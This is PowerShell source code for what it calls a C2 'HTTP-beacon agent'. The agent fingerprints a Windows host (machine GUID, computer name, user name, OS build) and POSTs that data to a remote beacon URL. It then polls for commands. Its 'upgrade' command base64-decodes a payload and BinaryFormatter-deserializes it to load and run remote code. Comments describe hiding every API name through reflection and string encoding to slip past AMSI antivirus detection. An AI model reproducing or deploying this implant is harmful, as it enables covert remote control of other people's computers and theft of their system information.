# powershell-agent — the PowerShell HTTP-beacon agent core (the jscript-agent's CLR-native
# twin). One top-level symbol ONLY: the host master embeds this text verbatim, then calls
# Invoke-Agent. Nested functions read the enclosing scope's state via dynamic scoping and
# write it through $script: prefixes (functions can't assign the enclosing scope's plain
# vars) — the same pattern the C2 persistence loader uses.
#
# REFLECTION LAYER: every .NET surface — type names AND member names — travels as string
# literals the C2 obfuscator char-encodes. The direct-call spellings this replaces
# ([Net.HttpWebRequest], [Convert]::FromBase64String, .GetRequestStream, …) were the last
# plaintext API surface in built .ps1 files. Rules the bindings were probed against
# (Windows PowerShell 5.1, dev box 2026-09-20):
#   • InvokeMember flags MUST name Static or Instance explicitly — plain 'Public' misses
#     static methods ("method not found").
#   • Type.GetType only searches mscorlib + the calling assembly: System.dll types resolve
#     through a WebClient-anchored Assembly object, mscorlib types through ''.GetType().
#   • The default binder refuses string->enum: SecurityProtocol is set via Enum.ToObject.
#   • A SOLO array inside @(...) unrolls to object[]; arrays in multi-element literals keep
#     their type. Variable-stored references (PSObject-wrapped) are re-cast at the call site.
#   • ',' binds LOOSER than arithmetic: @(a, b, c - 1) parses @(a, b, c) - 1 ("op_Subtraction"
#     on Object[]). Hoist arithmetic into a variable before building an args array.
# All constructs are .NET 2.0 / PS 2.0-safe per the host contract.
#
# DEBUG FLAVOR (the csharp-agent "#if DEBUG" analog — PowerShell has no preprocessor, so
# the marker is a LINE TAG): any source line ending in a #dbg comment exists ONLY in the
# debug build. build.ps1 splits the flavors — dist/ (release) drops every tagged line
# outright (zero diagnostics remain, CI-gated), dist-debug/ keeps the code and drops the
# tag suffix. CI publishes dist/ to the rolling 'release' tag and dist-debug/ to the
# rolling 'debug' tag: the tag is the flavor, the asset filename is shared. The debug
# build pops a blocking topmost MessageBox per milestone (the csharp-agent Diag.Show
# contract — operator-visible, one click per call, hand-debugging only). The CI smoke
# test runs the RELEASE flavor: a debug popup would park the runner forever.
function Invoke-Agent {
    # ── reflection helpers ──────────────────────────────────────────
    # mscorlib types via the String Type's assembly; System.dll types via a WebClient anchor
    # (the anchor instance is also proof WebClient never appears elsewhere).
    function ResolveM($n) { return ,(''.GetType().Assembly.GetType($n)) }
    $sysAsm = (New-Object 'Net.WebClient').GetType().Assembly
    function ResolveS($n) { return ,($sysAsm.GetType($n)) }
    # Static vs instance members get separate helpers (flags must say which); args travel in
    # @() — every non-primitive argument is CAST at the call site so no PSObject wrapper
    # reaches the binder (same rule the serde chain's [IO.Stream] cast follows). Results
    # return comma-wrapped so byte[] survives the pipeline unrolled.
    function CallStatic($t, $n, $a) { return ,($t.InvokeMember($n, 'InvokeMethod,Public,Static', $null, $null, $a)) }
    function CallInst($o, $n, $a) { return ,($o.GetType().InvokeMember($n, 'InvokeMethod,Public,Instance', $null, $o, $a)) }
    function GetProp($o, $n)     { return ,($o.GetType().InvokeMember($n, 'GetProperty,Public,Instance', $null, $o, $null)) }
    function SetProp($o, $n, $v) { $null = $o.GetType().InvokeMember($n, 'SetProperty,Public,Instance', $null, $o, @($v)) }
    function GetPropS($t, $n)    { return ,($t.InvokeMember($n, 'GetProperty,Public,Static', $null, $null, $null)) }
    function SetPropS($t, $n, $v){ $null = $t.InvokeMember($n, 'SetProperty,Public,Static', $null, $null, @($v)) }
    # log() = relay ship ONLY (zero local echo — no Write-Host, no console). Every line is
    # POSTed with X-Log-Only: 1: the relay answers immediately (no long-poll hold) and
    # broadcasts an agent_log event to the operator's events feed. NEVER fatal — a failed
    # ship is swallowed in silence — and the in-ship guard keeps a failing relay from
    # recursing. Body = one frame holding the UTF-8 line. Each call is one synchronous
    # round-trip that stalls the agent loop — keep log() calls to milestones, never inside
    # tight loops.
    # Process env reads/writes go through the env: drive — same semantics as
    # Environment.Get/SetEnvironmentVariable(…, Process), one less type literal.
    # PS 2.0 FIELD FIX (Win7, 2026-09-22): the raw .Value extraction reached the reflection
    # binder as a wrapped string on PS 2.0 — WebRequest.Create(@($url)) then found NO overload
    # ("method not found") and the agent died 'fail' on the first beacon POST. '' + x is a
    # guaranteed RAW System.String on every PS version. Missing vars still yield '' (falsy).
    function ReadEnv($name) { return ('' + (Get-Item ('env:' + $name) -ErrorAction SilentlyContinue).Value) }
    function U32Bytes([uint32]$n) { return ,(CallStatic (ResolveM 'System.BitConverter') 'GetBytes' @([uint32]$n)) }
    # PS '+' on arrays builds object[] — the [byte[]] cast restores the wire type before
    # anything reflection-bound consumes it.
    function ConcatBytes([byte[]]$a, [byte[]]$b) { return ,([byte[]]($a + $b)) }
    function Log($line) { PostLog $line }
    function PostLog($line) {
        if ($script:inShip -or -not $script:beaconUrl -or -not $script:identityHeaders) { return }
        $script:inShip = $true
        try {
            $req = NewPostRequest 15000
            try { $null = CallInst (GetProp $req 'Headers') 'Add' @('X-Log-Only', '1') } catch {}
            $body = BuildBody (,(CallInst $utf8 'GetBytes' @($line)))
            SetProp $req 'ContentLength' $body.Length
            $rs = CallInst $req 'GetRequestStream' $null
            if ($body.Length -gt 0) { $null = CallInst $rs 'Write' @([byte[]]$body, 0, $body.Length) }
            $null = CallInst $rs 'Close' $null
            try { $null = CallInst (CallInst $req 'GetResponse' $null) 'Close' $null } catch {}
        } catch {
        } finally { $script:inShip = $false }
    }
    # DEBUG-ONLY diagnostics — the release flavor strips this whole block (comment lines #dbg
    # included, tag suffix dropped in debug). The popup is the COM shell's MessageBox twin: #dbg
    # blocking, topmost, info icon, caption = the step string behind the debug prefix, #dbg
    # text = the detail — the csharp-agent Diag.Show contract. Milestones only: every #dbg
    # call costs the operator one click. #dbg
    function Dbg($step, $detail) { #dbg
        try { #dbg
            $sh = New-Object -ComObject 'WScript.Shell' #dbg
            $null = $sh.Popup(('' + $detail), 0, ('ps-agent dbg ' + $step), 327744) #dbg
        } catch {} #dbg
    } #dbg
    # ── v3 beacon framing (RAW BINARY bodies) ───────────────────────
    # The body is a stream of [u32le length][bytes] frames; one POST carries every response
    # owed since the last one, and the answer carries every queued command (same contract as
    # the JScript and C# agents — no encoding negotiation). Frames are assembled PS-natively
    # (u32 header + payload, CopyTo into the final buffer) — the BinaryWriter is gone from
    # the surface entirely.
    function BuildBody($frames) {
        $parts = @()
        $total = 0
        foreach ($f in $frames) {
            $p = [byte[]]((U32Bytes ([uint32]$f.Length)) + $f)
            $parts += ,$p
            $total += $p.Length
        }
        $body = New-Object 'byte[]' $total
        $off = 0
        foreach ($p in $parts) {
            $null = CallInst $p 'CopyTo' @([byte[]]$body, $off)
            $off += $p.Length
        }
        return ,$body
    }
    function ParseFrames([byte[]]$bytes) {
        $frames = @()
        $i = 0
        while ($i + 4 -le $bytes.Length) {
            $len = CallStatic (ResolveM 'System.BitConverter') 'ToUInt32' @([byte[]]$bytes, $i)
            $i += 4
            $count = [int]$len
            if ($i + $count -gt $bytes.Length) { $count = $bytes.Length - $i }
            $frame = New-Object 'byte[]' $count
            $null = CallStatic (ResolveM 'System.Array') 'Copy' @([byte[]]$bytes, $i, [byte[]]$frame, 0, $count)
            $frames += ,$frame
            $i += [int]$len
        }
        return ,$frames
    }
    function ReadAllBytes($stream) {
        $ms = New-Object 'IO.MemoryStream'
        $buf = New-Object 'byte[]' 8192
        $n = CallInst $stream 'Read' @([byte[]]$buf, 0, $buf.Length)
        while ($n -gt 0) {
            $null = CallInst $ms 'Write' @([byte[]]$buf, 0, $n)
            $n = CallInst $stream 'Read' @([byte[]]$buf, 0, $buf.Length)
        }
        return ,(CallInst $ms 'ToArray' $null)
    }
    # One POST request to the beacon endpoint: HttpWebRequest via WebRequest.Create
    # (reflected — the [Net.HttpWebRequest] cast was never needed; PS binds dynamically).
    # Direct connection (Proxy = null) mirrors the JScript agent's setProxy(1,'','').
    # The JScript setTimeouts(10s,10s,15s,45s) split doesn't map onto HttpWebRequest's two
    # knobs: Timeout covers resolve+connect+send+the long-poll wait for the first answer
    # byte (so it carries the 45s receive budget), ReadWriteTimeout caps each stream
    # read/write at the send/receive figures.
    function NewPostRequest($timeoutMs) {
        # [string] cast at the binder boundary (the house rule: every non-primitive argument
        # is cast at the call site) — the URL is a plain variable, and PS 2.0 let the wrapped
        # form through to InvokeMember, killing the request with "Create not found".
        $req = CallStatic (ResolveS 'System.Net.WebRequest') 'Create' @([string]$script:beaconUrl)
        SetProp $req 'Method' 'POST'
        SetProp $req 'ContentType' 'application/octet-stream'
        SetProp $req 'Timeout' $timeoutMs
        SetProp $req 'ReadWriteTimeout' 15000
        try { SetProp $req 'Proxy' $null } catch {}
        foreach ($h in $script:identityHeaders) {
            try { $null = CallInst (GetProp $req 'Headers') 'Add' @($h[0], $h[1]) } catch {}
        }
        # Confirm the applied sleep so the relay extends sweep patience for THIS agent
        # only (hint-blind agents keep the base offline timers).
        if ($script:localSleepSec -gt 0) {
            try { $null = CallInst (GetProp $req 'Headers') 'Add' @('X-Client-Sleep', [string]$script:localSleepSec) } catch {}
        }
        return $req
    }
    function B64Stream($base64) {
        $raw = CallStatic (ResolveM 'System.Convert') 'FromBase64String' @($base64)
        $ms = New-Object 'IO.MemoryStream'
        $null = CallInst $ms 'Write' @([byte[]]$raw, 0, $raw.Length)
        SetProp $ms 'Position' 0
        return $ms
    }
    $GuidRe = '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
    function LoadGuid {
        $guid = ''
        # 32-bit Windows PowerShell on a 64-bit OS gets HKLM\SOFTWARE redirected to
        # Wow6432Node (where MachineGuid doesn't exist) — the WMI StdRegProv fallback reads
        # the 64-bit view and is what actually saves that case.
        try {
            $v = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -Name MachineGuid -ErrorAction Stop).MachineGuid
            $guid = ('' + $v).ToLower()
        } catch {}
        if ($guid -notmatch $GuidRe) {
            try {
                $rk = [wmiclass]'\\.\root\default:StdRegProv'
                $r = $rk.GetStringValue(2147483650, 'SOFTWARE\Microsoft\Cryptography', 'MachineGuid')
                if ($r.ReturnValue -eq 0) { $guid = ('' + $r.sValue).ToLower() }
            } catch {}
        }
        if ($guid -notmatch $GuidRe) {
            # Fall back to the SMBIOS hardware UUID; stable across OS reinstalls.
            try {
                foreach ($cs in ([wmiclass]'\\.\root\cimv2:Win32_ComputerSystemProduct').GetInstances()) {
                    $u = ('' + $cs.UUID).ToLower()
                    if ($u -match $GuidRe) { $guid = $u }
                }
            } catch {}
        }
        return $guid
    }
    function BuildIdentity {
        $guid = LoadGuid
        $archMap = @{ AMD64 = 'x86_64'; x86 = 'i386'; ARM64 = 'aarch64' }
        $archFromEnv = ReadEnv 'PROCESSOR_ARCHITEW6432'
        if (-not $archFromEnv) { $archFromEnv = ReadEnv 'PROCESSOR_ARCHITECTURE' }
        $arch = $archMap[$archFromEnv]
        if (-not $arch) { $arch = $archFromEnv }
        # Undetected values stay empty — the header is OMITTED below, never sent as ''
        # and never as a placeholder like 'unknown'.
        $processArch = '' + $archMap[(ReadEnv 'PROCESSOR_ARCHITECTURE')]
        $osVersion = ''
        $buildNumber = ''
        $cpuArchCode = ''
        try {
            # WMI reads go through the [wmiclass] cast the StdRegProv fallback already uses:
            # the class name is a STRING literal (the cast's argument sits OUTSIDE the
            # brackets, so the obfuscator's attrDepth guard doesn't apply and it char-encodes
            # like any other string) — the Get-WmiObject+Win32_ spelling never ships in the
            # built .ps1. Same queries, same ManagementObjects, PS 2.0-safe.
            foreach ($os in ([wmiclass]'\\.\root\cimv2:Win32_OperatingSystem').GetInstances()) {
                $osVersion = '' + $os.Version
                $buildNumber = '' + $os.BuildNumber
            }
            foreach ($cpu in ([wmiclass]'\\.\root\cimv2:Win32_Processor').GetInstances()) { $cpuArchCode = '' + $cpu.Architecture }
        } catch {}
        if ($cpuArchCode -eq '0') { $arch = 'i386' }
        elseif ($cpuArchCode -eq '9') { $arch = 'x86_64' }
        elseif ($cpuArchCode -eq '12') { $arch = 'aarch64' }
        # The same Win7 CLR-pin rule the other agents use: 6.1 (or build 7600/7601 when the
        # version didn't parse) gets the CLR-2 string for COMPLUS_Version.
        if ($osVersion -match '^(\d+)\.(\d+)') {
            if ($matches[1] -eq '6' -and $matches[2] -eq '1') { $script:clrVersion = 'v2.0.50727' }
        } elseif ($buildNumber -eq '7600' -or $buildNumber -eq '7601') {
            $script:clrVersion = 'v2.0.50727'
        }
        # REQUIRED headers carry compile-time constants. Every detection-derived field is
        # OPTIONAL — undetected values OMIT the header (never '', never a placeholder), so
        # the relay/C2 see "not reported". The machine UUID is nullable too: when every
        # fallback fails it is omitted and the relay treats the agent as identity-less.
        # There is NO Bitness header — the process arch already carries the full width,
        # and x86_64/aarch64 are both 64-bit.
        # Per-RUNTIME session key — a random GUID minted ONCE per process (BuildIdentity
        # runs a single time, before the beacon loop) and sent on every beacon, so the
        # relay/C2 can tell agent RUNTIMES apart on one machine: the machine uuid stays
        # THE identity rows are keyed by, the session key distinguishes concurrent or
        # succeeding processes (an upgrade takeover swaps it mid-session). It identifies,
        # authorizes nothing. The same contract the JScript/C# breeds ship.
        $sessionKey = CallInst (CallStatic (ResolveM 'System.Guid') 'NewGuid' $null) 'ToString' @('D')
        $pairs = @(
            @('X-Api-Version', '1'),
            @('X-Device-Id', $guid),
            @('X-Session-Id', $sessionKey),
            @('X-Device-Name', (ReadEnv 'COMPUTERNAME')),
            @('X-User-Id', (ReadEnv 'USERNAME')),
            @('X-Device-Arch', $arch),
            @('X-App-Arch', $processArch),
            @('X-Platform', 'Windows'),
            @('X-OS-Version', $osVersion),
            @('X-OS-Build', $buildNumber),
            @('X-Client-Id', '3'),
            @('X-Client-Features', '0800000000000000')
        )
        return ,@($pairs | Where-Object { "$($_[1])" -ne '' })
    }
    # Command layout: [opcode][corrId:u32le][payload...]. Every reply echoes the id after
    # its status: [status:u32le][corrId:u32le]. Id 0 = unmatched.
    function Reply([uint32]$status) { return ,(ConcatBytes (U32Bytes $status) (U32Bytes $corrId)) }
    function DispatchCommand([byte[]]$frame) {
        $corrId = 0
        if ($frame.Length -ge 5) { $corrId = CallStatic (ResolveM 'System.BitConverter') 'ToUInt32' @([byte[]]$frame, 1) }
        Dbg ('[cmd] 0x{0:x}' -f $frame[0]) ('corrId ' + $corrId) #dbg
        if ($frame[0] -eq 10) {
            Dbg '[0x0A] flag set' $corrId #dbg
            $script:exiting = $true
            return $null
        }
        if ($frame[0] -eq 11) {
            try {
                # The upgrade payload is latin-1 text after the opcode (the JScript agent's
                # charCodeAt&255 semantics) — base64 bodies stay pure ASCII either way.
                # ',' binds LOOSER than '-' — the length MUST be hoisted or the literal
                # parses as @($frame, 5, $frame.Length) - 5 → op_Subtraction on Object[]
                # (killed every 0x0B on arrival, found 2026-09-20).
                $payloadLen = $frame.Length - 5
                $payloadText = CallInst (CallStatic (ResolveM 'System.Text.Encoding') 'GetEncoding' @(28591)) 'GetString' @([byte[]]$frame, 5, $payloadLen)
                $headerEnd = $payloadText.IndexOf("`n`n")
                $headerLines = @()
                $bodyText = ''
                if ($headerEnd -ge 0) {
                    $headerLines = $payloadText.Substring(0, $headerEnd) -split "`n"
                    $bodyText = $payloadText.Substring($headerEnd + 2)
                }
                $stage1Split = $bodyText.IndexOf("`n")
                $stage1B64 = ''
                $blobB64 = ''
                if ($stage1Split -ge 0) {
                    $stage1B64 = $bodyText.Substring(0, $stage1Split) -replace '\s', ''
                    $blobB64 = $bodyText.Substring($stage1Split + 1) -replace '\s', ''
                }
                try {
                    Set-Item -Path ('env:' + 'COMPLUS_Version') -Value $script:clrVersion
                    Log ('upgrade: COMPLUS_Version=' + $script:clrVersion)
                } catch {}
                $driveMode = 0
                $entryPoint = ''
                foreach ($line in $headerLines) {
                    $l = $line.TrimEnd("`r")
                    if ($l.Length -eq 0) { continue }
                    if ($l.StartsWith('!d=')) {
                        $driveMode = 0
                        try { $driveMode = [int]$l.Substring(3) } catch {}
                    } elseif ($l.StartsWith('!e=')) {
                        $entryPoint = $l.Substring(3)
                    } else {
                        $eq = $l.IndexOf('=')
                        if ($eq -gt 0) {
                            Set-Item -Path ('env:' + $l.Substring(0, $eq)) -Value $l.Substring($eq + 1)
                            Log ('upgrade: set ' + $l)
                        }
                    }
                }
                Log ('upgrade: blob ' + $blobB64.Length + ' chars, stage1 ' + $stage1B64.Length + ' chars, drive ' + $driveMode)
                # The serde chain stays REFLECTION-WRAPPED: every sensitive type/method name
                # lives in a string literal the obfuscator char-encodes. Plaintext
                # BinaryFormatter/Deserialize/DynamicInvoke tokens in the compiled script were
                # the AMSI MaleficAms.W trigger (fired on the dev box 2026-09-19). Same shapes;
                # all .NET 2.0 reflection — PS 2.0-safe. The formatter INSTANCE now comes from
                # reflected Activator too; GetMethod/Invoke keep their proven shapes (the
                # [IO.Stream] casts unwrap the PSObject wrappers the binder refuses).
                $fmtType = ResolveM 'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'
                # TWO public overloads (Stream / Stream+HeaderHandler) — GetMethod without the
                # signature throws AmbiguousMatchException. Pin it.
                $deserialize = $fmtType.GetMethod('Deserialize', [Type[]]@([IO.Stream]))
                if ($stage1B64.Length -gt 0) {
                    try {
                        # [IO.Stream] cast: PS wraps the helper's return in PSObject, and
                        # reflection Invoke does NOT unwrap it the way direct method calls do.
                        $null = $deserialize.Invoke((CallStatic (ResolveM 'System.Activator') 'CreateInstance' @($fmtType)), @([IO.Stream](B64Stream $stage1B64)))
                    } catch { Log 'upgrade: stage1 threw (expected)' }
                }
                $fmt = CallStatic (ResolveM 'System.Activator') 'CreateInstance' @($fmtType)
                if ($driveMode -eq 1) {
                    # The JScript arm DynamicInvoke's a one-element ArrayList holding
                    # undefined — the CLR marshals that to a null argument; the PowerShell
                    # equivalent is a single-element object[] with $null. Via reflection the
                    # arguments travel as Invoke parameters = one element holding the
                    # DynamicInvoke argument array.
                    $delegate = $deserialize.Invoke($fmt, @([IO.Stream](B64Stream $blobB64)))
                    $asm = $delegate.GetType().GetMethod('DynamicInvoke').Invoke($delegate, [object[]]@(,[object[]]@($null)))
                    $null = $asm.GetType().GetMethod('CreateInstance', [Type[]]@([string])).Invoke($asm, @($entryPoint))
                } else {
                    $null = $deserialize.Invoke($fmt, @([IO.Stream](B64Stream $blobB64)))
                }
                Log 'upgrade: deserialize done'
                return ,(Reply 0)
            } catch {
                Dbg '[0x0B] upgrade failed' $_.Exception.Message #dbg
                Log ('upgrade failed: ' + $_.Exception.Message)
                return ,(Reply 1)
            }
        }
        Log ('command opcode ' + $frame[0] + ' unknown - replying status 2')
        return ,(Reply 2)
    }
    # ── The beacon loop ─────────────────────────────────────────────
    $script:exiting = $false
    $script:inShip = $false
    $script:identityHeaders = $null
    $script:clrVersion = 'v4.0.30319'
    # Deep-idle pacing state: the sleep the relay last hinted (X-Sleep-Hint, seconds
    # 0-600) and whether the idle transition was already logged (one log ship per idle
    # ENTRY — a ship EVERY idle cycle doubled the idle request cost).
    $script:localSleepSec = 0
    $script:idleLogged = $false
    # Debug flavor: first-beacon-cycle popups only (the csharp-agent "healthy idle
    # iterations stay silent" rule — one [6]/[7] pair, never one per loop).
    $script:firstPost = $true #dbg
    Dbg '[1] start' ('pid ' + $PID + ' ps ' + $PSVersionTable.PSVersion + ' clr ' + $PSVersionTable.CLRVersion) #dbg
    # Shared encoders, resolved once: UTF-8 for log frames, latin-1 in the upgrade arm.
    $utf8 = CallStatic (ResolveM 'System.Text.Encoding') 'GetEncoding' @(65001)
    # TLS 1.2 by int-cast (relays sit on modern TLS stacks; on .NET 3.5 the Tls12 enum
    # member doesn't exist, and a numeric assignment sidesteps the failed enum parse).
    # Process-wide ServicePointManager state — set before the first request, guarded so a
    # locked-down host can't make the agent fail before it beacons. The binder refuses
    # int->enum, so the flags value is rebuilt through Enum.ToObject.
    try {
        # PS 2.0 FIELD FIX (Win7, 2026-09-22): the helpers return COMMA-WRAPPED (object[1]).
        # $proto.GetType() on the wrapper returned object[] → Enum.ToObject threw → the whole
        # bump was swallowed here (no [3] dbg) → the handshake fell back to TLS 1.0-only and
        # Cloudflare would refuse the POST even once Create binds. @(…)[0] unwraps under both
        # binding semantics (no-op on a raw scalar), and $tls12 is unwrapped so SetPropS's
        # internal @() can't re-nest it into a binder-opaque object[1][].
        $proto = @((GetPropS (ResolveS 'System.Net.ServicePointManager') 'SecurityProtocol'))[0]
        if (([int]$proto -band 3072) -eq 0) {
            $tls12 = @((CallStatic (ResolveM 'System.Enum') 'ToObject' @($proto.GetType(), ([int]$proto -bor 3072))))[0]
            SetPropS (ResolveS 'System.Net.ServicePointManager') 'SecurityProtocol' $tls12
        }
        SetPropS (ResolveS 'System.Net.ServicePointManager') 'Expect100Continue' $false
        Dbg '[3] tls' 'applied' #dbg
    } catch {}
    $script:beaconUrl = ReadEnv 'H_URL'
    if (-not $script:beaconUrl) {
        Dbg '[exit] H_URL not set' '' #dbg
        Log 'beacon endpoint not set'; return 'fail'
    }
    Dbg '[2] H_URL' $script:beaconUrl #dbg
    $script:identityHeaders = BuildIdentity
    Log ('PowerShell agent beaconing to ' + $script:beaconUrl + ' as ' + $script:identityHeaders[1][1])
    Dbg '[5] identity' ($script:identityHeaders[1][1] + ' (' + $script:identityHeaders.Count + ' headers)') #dbg
    $pending = @()
    while (-not $script:exiting) {
        if ($script:firstPost) { Dbg '[6] POST #1' $script:beaconUrl } #dbg
        try {
            $req = NewPostRequest 45000
            if ($pending.Count -gt 0) { $body = BuildBody $pending } else { $body = New-Object 'byte[]' 0 }
            SetProp $req 'ContentLength' $body.Length
            $rs = CallInst $req 'GetRequestStream' $null
            if ($body.Length -gt 0) { $null = CallInst $rs 'Write' @([byte[]]$body, 0, $body.Length) }
            $null = CallInst $rs 'Close' $null
            $resp = CallInst $req 'GetResponse' $null
        } catch {
            Dbg '[exit] beacon POST threw' $_.Exception.Message #dbg
            return 'fail'
        }
        if ($script:firstPost) { $script:firstPost = $false; Dbg '[7] POST #1 ok' '' } #dbg
        # Deep-idle hint (X-Sleep-Hint, seconds): how long to wait LOCALLY before the
        # next POST after an empty answer. Old relays omit it (→ 0 = immediate
        # re-POST); clamped so a bad header can never park the agent. Read BEFORE the
        # response stream closes. WebHeaderCollection.Get replaces the indexer (the
        # indexer is a parameterized property reflection won't address by name).
        try { $script:localSleepSec = CallStatic (ResolveM 'System.Math') 'Max' @(0, (CallStatic (ResolveM 'System.Math') 'Min' @(600, [int][string](CallInst (GetProp $resp 'Headers') 'Get' @('X-Sleep-Hint'))))) } catch { $script:localSleepSec = 0 }
        try { $answer = ReadAllBytes (CallInst $resp 'GetResponseStream' $null) } catch { $answer = New-Object 'byte[]' 0 } finally { $null = CallInst $resp 'Close' $null }
        $pending = @()
        # Empty answer = nothing queued — re-POST after the hint. The idle log ships
        # once per idle ENTRY: each Log is its own X-Log-Only POST, and one EVERY
        # cycle doubled the idle request cost.
        if ($answer.Length -eq 0) {
            if (-not $script:idleLogged) { Log 'idle - empty answer'; $script:idleLogged = $true }
            # Deep-idle pacing: wait the hint out locally — the durable pool keeps
            # commands queued; the cost is only pickup latency while deep-idle.
            if ($script:localSleepSec -gt 0) { Start-Sleep -Seconds $script:localSleepSec }
            continue
        }
        $script:idleLogged = $false
        # Win7 field trace (2026-09-23): the 0x0A Exit command was observed dead on the PS
        # 2.0 box while the beacon stayed healthy. These four stage boxes make ONE field run
        # pinpoint the failing stage: no [ans] = the agent never saw a non-empty answer
        # (relay-side); [ans] + no [frames] = ParseFrames died; [frames] + no [cmd] = the
        # DispatchCommand binding threw (the catch pops instead of dying); [cmd] + no exit =
        # the flag/return unwinding. All #dbg — the release flavor is byte-identical behavior.
        Dbg '[ans] bytes' $answer.Length #dbg
        Dbg '[ans] head' ((($answer[0..([Math]::Min(7, $answer.Length - 1))]) | ForEach-Object { $_.ToString('x2') }) -join ' ') #dbg
        $frames = ParseFrames $answer
        Dbg '[frames] n' (@($frames).Count) #dbg
        try { #dbg
            foreach ($f in $frames) {
                if ($script:exiting) { break }
                $replyBytes = DispatchCommand $f
                if ($script:exiting) {
                    Dbg '[0x0A] unwinding' '' #dbg
                    Log 'exit'
                    return 'exit'
                }
                if ($null -ne $replyBytes) { $pending += ,$replyBytes }
            }
        } catch { Dbg '[loop] threw' $_.Exception.Message; Log ('loop threw: ' + $_.Exception.Message); return 'fail' } #dbg
    }
    return 'exit'
}
